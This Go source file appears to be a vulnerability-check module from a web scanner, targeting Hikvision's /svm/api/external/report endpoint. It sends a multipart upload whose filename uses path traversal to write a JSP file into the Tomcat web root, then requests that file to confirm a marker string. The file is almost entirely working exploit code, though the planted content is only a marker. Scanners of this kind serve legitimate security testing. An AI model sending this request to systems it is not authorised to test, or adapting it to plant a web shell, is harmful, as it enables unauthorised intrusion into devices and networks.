package HIKVISION

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func Hikvision_svm_api_files_rce(u string) bool {

	var payload = "------WebKitFormBoundary9PggsiM755PLa54a\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../tomcat85linux64.1/webapps/els/static/1ndex.jsp\"\r\nContent-Type: application/zip\r\n\r\ndac4990498b32d7a95ce5a512\r\n------WebKitFormBoundary9PggsiM755PLa54a--"

	header := make(map[string]string)
	header["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a"

	if req, err := pkg.HttpRequset(u+"/svm/api/external/report", "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 && strings.Contains(req.Body, "code") && strings.Contains(req.Body, "msg") {
			if req2, err := pkg.HttpRequset(u+"/els/static/1ndex.jsp", "GET", "", false, nil); err == nil {
				if req2.StatusCode == 200 && strings.Contains(req2.Body, "dac4990498b32d7a95ce5a512") {
					pkg.GoPocLog(fmt.Sprintf("Found vuln hikvision api_file_upload_rce|%s\n", u+"els/static/1ndex.jsp"))
					return true
				}
			}
		}
	}
	return false
}
